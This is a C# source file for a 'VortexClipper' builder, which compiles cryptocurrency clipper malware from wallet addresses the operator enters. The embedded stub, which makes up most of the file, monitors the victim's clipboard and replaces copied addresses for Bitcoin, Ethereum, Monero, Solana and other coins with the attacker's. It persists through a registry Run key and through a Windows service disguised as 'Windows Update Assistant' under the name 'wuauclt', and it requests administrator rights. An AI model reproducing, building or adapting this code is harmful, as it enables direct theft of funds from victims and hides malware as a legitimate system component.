using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Linq;

namespace VortexClipper
{
    internal class Program
    {
        private static readonly string ProjectTemplate = @"<?xml version=""1.0"" encoding=""utf-8""?>
<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
  <Import Project=""$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')"" />
  <PropertyGroup>
    <Configuration Condition="" '$(Configuration)' == '' "">Release</Configuration>
    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>
    <ProjectGuid>{0}</ProjectGuid>
    <OutputType>WinExe</OutputType>
    <RootNamespace>VortexClipper</RootNamespace>
    <AssemblyName>{1}</AssemblyName>
    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
    <Deterministic>true</Deterministic>
    <DebugType>none</DebugType>
    <DebugSymbols>false</DebugSymbols>
    <ApplicationManifest>app.manifest</ApplicationManifest>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>false</DebugSymbols>
    <DebugType>none</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>none</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include=""System"" />
    <Reference Include=""System.Core"" />
    <Reference Include=""System.Windows.Forms"" />
    <Reference Include=""System.Xml.Linq"" />
    <Reference Include=""System.Data.DataSetExtensions"" />
    <Reference Include=""Microsoft.CSharp"" />
    <Reference Include=""System.Data"" />
    <Reference Include=""System.Net.Http"" />
    <Reference Include=""System.Xml"" />
    <Reference Include=""System.ServiceProcess"" />
    <Reference Include=""System.Configuration.Install"" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include=""Stub.cs"" />
  </ItemGroup>
  <ItemGroup>
    <None Include=""app.manifest"" />
  </ItemGroup>
  <Import Project=""$(MSBuildToolsPath)\Microsoft.CSharp.targets"" />
  <Target Name=""AfterBuild"">
    <Copy SourceFiles=""$(TargetPath)"" DestinationFolder=""build"" />
  </Target>
</Project>";

        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine("VortexClipper Builder");
            Console.WriteLine("=====================");

            // Collect user input
            Console.WriteLine("\nEnter your cryptocurrency addresses:");
            Console.Write("Bitcoin: ");
            string btcAddress = Console.ReadLine();

            Console.Write("Ethereum: ");
            string ethAddress = Console.ReadLine();

            Console.Write("Monero: ");
            string xmrAddress = Console.ReadLine();

            Console.Write("Tron: ");
            string trxAddress = Console.ReadLine();

            Console.Write("USDT (ERC-20): ");
            string usdtErc20Address = Console.ReadLine();

            Console.Write("USDT (TRC-20): ");
            string usdtTrc20Address = Console.ReadLine();

            Console.Write("USDT (Omni): ");
            string usdtOmniAddress = Console.ReadLine();

            Console.Write("TON: ");
            string tonAddress = Console.ReadLine();

            Console.Write("Dogecoin: ");
            string dogeAddress = Console.ReadLine();

            Console.Write("Litecoin: ");
            string ltcAddress = Console.ReadLine();

            Console.Write("DASH: ");
            string dashAddress = Console.ReadLine();

            Console.Write("Solana: ");
            string solAddress = Console.ReadLine();

            Console.Write("\nEnter clipboard check interval (in milliseconds): ");
            if (!int.TryParse(Console.ReadLine(), out int interval))
            {
                interval = 100; // Default value
            }

            // Read Stub.cs content
            string stubContent = File.ReadAllText("Stub.cs");

            // Replace placeholder values
            Console.WriteLine("\nЗаменяю плейсхолдеры с адресами криптовалют...");
            
            // Placeholders checking
            if (!stubContent.Contains("BTC_ADDRESS") || !stubContent.Contains("ETH_ADDRESS"))
            {
                Console.WriteLine("ВНИМАНИЕ! В файле Stub.cs не найдены плейсхолдеры для криптовалют.");
                Console.WriteLine("Файл будет перезаписан с правильными плейсхолдерами.\n");
                
                string stubTemplate = @"using System;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Security.Principal;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using System.ServiceProcess;
using System.ComponentModel;
using System.Configuration.Install;
using System.Reflection;
using System.Collections.Generic;
using System.Linq;

namespace VortexClipper
{
    internal class Program
    {
        internal const string SERVICE_NAME = ""wuauclt"";
        private const string SERVICE_DISPLAY_NAME = ""Windows Update Assistant"";
        private const string SERVICE_DESCRIPTION = ""Assists in automatically installing updates."";
        private const string STARTUP_REG_KEY = @""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"";
        private const string STARTUP_REG_VALUE = ""Windows Update Assistant"";

        // Cryptocurrency address regex patterns
        private static readonly (Regex Pattern, string Replacement)[] CryptoPatterns = new[]
        {
            // Bitcoin patterns
            (new Regex(@""^bc1[0-9A-Za-z]{39,59}$"", RegexOptions.Compiled), ""BTC_ADDRESS""),
            (new Regex(@""^3[0-9A-Za-z]{25,34}$"", RegexOptions.Compiled), ""BTC_ADDRESS""),
            (new Regex(@""^1[0-9A-Za-z]{25,34}$"", RegexOptions.Compiled), ""BTC_ADDRESS""),
            
            // Ethereum pattern
            (new Regex(@""^0x[0-9A-Fa-f]{40}$"", RegexOptions.Compiled), ""ETH_ADDRESS""),
            
            // Monero pattern
            (new Regex(@""^[48][0-9AB][0-9A-Za-z]{93,104}$"", RegexOptions.Compiled), ""XMR_ADDRESS""),
            
            // Tron pattern
            (new Regex(@""^T[0-9A-Za-z]{33}$"", RegexOptions.Compiled), ""TRX_ADDRESS""),
            
            // TON pattern
            (new Regex(@""^0:[0-9A-Fa-f]{64}$"", RegexOptions.Compiled), ""TON_ADDRESS""),
            
            // Dogecoin pattern
            (new Regex(@""^D[0-9A-Za-z]{33}$"", RegexOptions.Compiled), ""DOGE_ADDRESS""),
            
            // Litecoin pattern
            (new Regex(@""^[LM][0-9A-Za-z]{33}$"", RegexOptions.Compiled), ""LTC_ADDRESS""),
            
            // DASH pattern
            (new Regex(@""^X[0-9A-Za-z]{33}$"", RegexOptions.Compiled), ""DASH_ADDRESS""),
            
            // Solana pattern
            (new Regex(@""^[1-9A-HJ-NP-Za-km-z]{32,44}$"", RegexOptions.Compiled), ""SOL_ADDRESS"")
        };

        // Last clipboard text to prevent unnecessary processing
        private static string _lastClipboardText = string.Empty;

        // Clipboard check interval in milliseconds
        private const int CLIPBOARD_CHECK_INTERVAL = CHECK_INTERVAL;

        [STAThread]
        static void Main(string[] args)
        {
            if (Environment.UserInteractive)
            {
                if (args.Length > 0)
                {
                    switch (args[0].ToLower())
                    {
                        case ""/install"":
                            InstallService();
                            return;
                        case ""/uninstall"":
                            UninstallService();
                            return;
                    }
                }

                if (!IsAdministrator())
                {
                    if (RequestAdministratorPrivileges())
                    {
                        return;
                    }
                    else
                    {
                        AddToStartup();
                        
                        MessageBox.Show(
                            ""Для корректной работы приложения необходимы права администратора.\n"" +
                            ""Программа будет продолжать работу, но некоторые функции могут быть недоступны."",
                            ""Внимание"", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
                else
                {
                    InstallService();
                    
                    StartClipboardMonitoring();
                    return;
                }
            }
            else
            {
                ServiceBase.Run(new CryptoClipboardService());
                return;
            }

            StartClipboardMonitoring();
        }

        /// <summary>
        /// Starting clipboard monitoring
        /// </summary>
        internal static void StartClipboardMonitoring()
        {
            // Create a thread for monitoring the clipboard
            Thread clipboardMonitorThread = new Thread(MonitorClipboard)
            {
                IsBackground = true
            };

            // Start monitoring the clipboard
            clipboardMonitorThread.Start();

            // Keep the application running
            Thread.Sleep(Timeout.Infinite);
        }

        /// <summary>
        /// Continuously monitors the clipboard for cryptocurrency addresses
        /// </summary>
        private static void MonitorClipboard()
        {
            while (true)
            {
                try
                {
                    // Thread-safe clipboard access
                    string clipboardText = null;
                    
                    // Use STAThread to access clipboard
                    Thread staThread = new Thread(() =>
                    {
                        try
                        {
                            if (Clipboard.ContainsText())
                            {
                                clipboardText = Clipboard.GetText();
                            }
                        }
                        catch
                        {
                            // Ignore clipboard access errors
                        }
                    });
                    
                    staThread.SetApartmentState(ApartmentState.STA);
                    staThread.Start();
                    staThread.Join();

                    // If we got text from the clipboard and it's different from the last check
                    if (!string.IsNullOrEmpty(clipboardText) && clipboardText != _lastClipboardText)
                    {
                        _lastClipboardText = clipboardText;
                        
                        if (IsCryptocurrencyAddress(clipboardText, out string replacementAddress))
                        {
                            // Replace the cryptocurrency address with the configured one
                            ReplaceClipboardWithAddress(replacementAddress);
                        }
                    }
                }
                catch
                {
                    // Silently catch any errors to keep the monitoring running
                }

                // Wait for the configured interval before checking again
                Thread.Sleep(CLIPBOARD_CHECK_INTERVAL);
            }
        }

        /// <summary>
        /// Checks if the provided text matches any cryptocurrency address pattern
        /// </summary>
        private static bool IsCryptocurrencyAddress(string text, out string replacementAddress)
        {
            // Clean the text (remove whitespace and newlines)
            text = text.Trim();

            foreach (var (pattern, replacement) in CryptoPatterns)
            {
                if (pattern.IsMatch(text) && !string.IsNullOrEmpty(replacement))
                {
                    replacementAddress = replacement;
                    return true;
                }
            }

            replacementAddress = null;
            return false;
        }

        /// <summary>
        /// Replaces the clipboard content with the specified address
        /// </summary>
        private static void ReplaceClipboardWithAddress(string address)
        {
            try
            {
                // Use STAThread to access clipboard
                Thread staThread = new Thread(() =>
                {
                    try
                    {
                        Clipboard.SetText(address);
                        _lastClipboardText = address;
                    }
                    catch
                    {
                    }
                });
                
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();
            }
            catch
            {
            }
        }

        #region Запуск, службы, автозапуск

        /// <summary>
        /// UAC Checking
        /// </summary>
        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// UAC Request
        /// </summary>
        private static bool RequestAdministratorPrivileges()
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.UseShellExecute = true;
                startInfo.WorkingDirectory = Environment.CurrentDirectory;
                startInfo.FileName = Assembly.GetEntryAssembly().Location;
                startInfo.Verb = ""runas"";

                Process.Start(startInfo);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Adding programm to autorun via registry
        /// </summary>
        private static void AddToStartup()
        {
            try
            {
                string appPath = Assembly.GetEntryAssembly().Location;

                RegistryKey key = Registry.CurrentUser.OpenSubKey(STARTUP_REG_KEY, true);
                key.SetValue(STARTUP_REG_VALUE, appPath);
                key.Close();
                
            }
            catch (Exception ex)
            {
                MessageBox.Show($""Failed to add to startup: {ex.Message}"", ""Error"", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Windows service installing
        /// </summary>
        private static void InstallService()
        {
            try
            {
                string executablePath = Assembly.GetEntryAssembly().Location;

                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = ""sc.exe"";
                startInfo.Arguments = $""create \""{SERVICE_NAME}\"" binPath= \""{executablePath}\"" start= auto DisplayName= \""{SERVICE_DISPLAY_NAME}\"""";
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                startInfo.RedirectStandardOutput = true;

                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

                startInfo.Arguments = $""description \""{SERVICE_NAME}\"" \""{SERVICE_DESCRIPTION}\"""";
                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

                startInfo.Arguments = $""start \""{SERVICE_NAME}\"""";
                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show($""Failed to install service: {ex.Message}"", ""Error"", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Windows service deleting
        /// </summary>
        private static void UninstallService()
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = ""sc.exe"";
                startInfo.Arguments = $""stop \""{SERVICE_NAME}\"""";
                startInfo.UseShellExecute = false;
                startInfo.CreateNoWindow = true;
                startInfo.RedirectStandardOutput = true;

                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

                startInfo.Arguments = $""delete \""{SERVICE_NAME}\"""";
                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                }

                MessageBox.Show(""Service uninstalled successfully."", ""Success"", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($""Failed to uninstall service: {ex.Message}"", ""Error"", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        #endregion
    }

    /// <summary>
    /// Windows service class
    /// </summary>
    public class CryptoClipboardService : ServiceBase
    {
        public CryptoClipboardService()
        {
            this.ServiceName = Program.SERVICE_NAME;
        }

        protected override void OnStart(string[] args)
        {
            
            Thread thread = new Thread(Program.StartClipboardMonitoring);
            thread.Start();
        }

        protected override void OnStop()
        {
            
        }
    }
}";
                
                stubContent = stubTemplate;
            }
            
            stubContent = stubContent
                .Replace("\"BTC_ADDRESS\"", $"\"{btcAddress}\"")
                .Replace("\"ETH_ADDRESS\"", $"\"{ethAddress}\"")
                .Replace("\"XMR_ADDRESS\"", $"\"{xmrAddress}\"")
                .Replace("\"TRX_ADDRESS\"", $"\"{trxAddress}\"")
                .Replace("\"USDT_ERC20_ADDRESS\"", $"\"{usdtErc20Address}\"")
                .Replace("\"USDT_TRC20_ADDRESS\"", $"\"{usdtTrc20Address}\"")
                .Replace("\"USDT_OMNI_ADDRESS\"", $"\"{usdtOmniAddress}\"")
                .Replace("\"TON_ADDRESS\"", $"\"{tonAddress}\"")
                .Replace("\"DOGE_ADDRESS\"", $"\"{dogeAddress}\"")
                .Replace("\"LTC_ADDRESS\"", $"\"{ltcAddress}\"")
                .Replace("\"DASH_ADDRESS\"", $"\"{dashAddress}\"")
                .Replace("\"SOL_ADDRESS\"", $"\"{solAddress}\"")
                .Replace("CHECK_INTERVAL", interval.ToString());
                
            Console.WriteLine("\nChecking that placeholders have been replaced correctly:");
            bool allReplacementsValid = true;
            
            if (stubContent.Contains("BTC_ADDRESS")) 
            { 
                Console.WriteLine("ATTENTION: BTC_ADDRESS placeholder not replaced");
                allReplacementsValid = false;
            }
            if (stubContent.Contains("ETH_ADDRESS")) 
            { 
                Console.WriteLine("NOTE: The ETH_ADDRESS placeholder has not been replaced");
                allReplacementsValid = false;
            }
            if (stubContent.Contains("CHECK_INTERVAL")) 
            { 
                Console.WriteLine("WARNING: CHECK_INTERVAL placeholder not replaced");
                allReplacementsValid = false;
            }
            
            if (allReplacementsValid)
            {
                Console.WriteLine("All placeholders have been successfully replaced!");
            }

            string projectName = GenerateRandomName();
            string projectGuid = Guid.NewGuid().ToString("B").ToUpper();

            Directory.CreateDirectory("build");

            string manifestContent = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""VortexClipper""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>";
            File.WriteAllText("app.manifest", manifestContent);

            // Write updated Stub.cs
            File.WriteAllText("Stub.cs", stubContent);

            // Generate project file
            string projectContent = string.Format(ProjectTemplate, projectGuid, projectName);
            File.WriteAllText($"{projectName}.csproj", projectContent);

            // Build the project
            Console.WriteLine("\nBuilding project...");
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "msbuild.exe";
            startInfo.Arguments = $"{projectName}.csproj /p:Configuration=Release /p:Platform=AnyCPU /t:Clean,Build /v:n";
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.CreateNoWindow = true;

            bool buildSuccess = false;
            using (Process process = Process.Start(startInfo))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                
                process.WaitForExit();
                
                buildSuccess = process.ExitCode == 0;
                
                if (!string.IsNullOrEmpty(output))
                {
                    Console.WriteLine("Build output:");
                    Console.WriteLine(output);
                }
                
                if (!string.IsNullOrEmpty(error))
                {
                    Console.WriteLine("Build errors:");
                    Console.WriteLine(error);
                }
            }

            // Clean up temporary files
            File.Delete($"{projectName}.csproj");
            File.Delete("app.manifest");

            if (buildSuccess)
            {
                Console.WriteLine($"\nBuild complete! Executable is in the 'build' folder as '{projectName}.exe'");
                
                string exePath = Path.Combine("build", $"{projectName}.exe");
                if (File.Exists(exePath))
                {
                    Console.WriteLine($"File successfully created: {exePath}");
                }
                else
                {
                    Console.WriteLine($"WARNING: The file {exePath} was not found, although the build was successful!");
                    Console.WriteLine("Searching for the executable file...");
                    
                    string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), $"{projectName}.exe", SearchOption.AllDirectories);
                    if (files.Length > 0)
                    {
                        Console.WriteLine($"Found executable at: {files[0]}");
                        
                        if (!files[0].EndsWith(exePath))
                        {
                            try
                            {
                                File.Copy(files[0], exePath, true);
                                Console.WriteLine($"Copied to: {exePath}");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"Error copying file: {ex.Message}");
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("No executable found. Make sure MSBuild is installed correctly.");
                    }
                }
            }
            else
            {
                Console.WriteLine("\nBuild FAILED! Check the errors above.");
            }

            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        private static string GenerateRandomName()
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            using (var rng = new RNGCryptoServiceProvider())
            {
                var bytes = new byte[7];
                rng.GetBytes(bytes);
                return new string(bytes.Select(b => chars[b % chars.Length]).ToArray());
            }
        }
    }
} 